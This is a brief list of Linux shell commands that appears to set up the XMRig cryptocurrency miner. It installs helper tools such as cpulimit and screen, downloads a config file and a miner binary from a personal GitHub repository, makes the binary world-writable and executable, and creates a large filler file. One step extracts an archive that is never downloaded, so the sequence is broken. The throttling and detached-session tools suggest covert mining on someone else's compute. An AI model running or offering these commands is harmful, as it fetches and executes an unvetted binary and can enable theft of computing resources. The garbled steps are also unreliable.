apt install psmisc -y && apt install bc -y && apt install cpulimit -y && apt install vim -y && apt install screen -y

wget https://raw.githubusercontent.com/BrunuhVille/xxss/main/config.json && wget https://github.com/BrunuhVille/xxss/raw/main/xmrig

tar -zxvf xmrig-v6.8.2-C3-lin64-Static.tar.gz

chmod 777 xmrig

vim config.json

dd if=/dev/zero of=wu bs=1M count=300
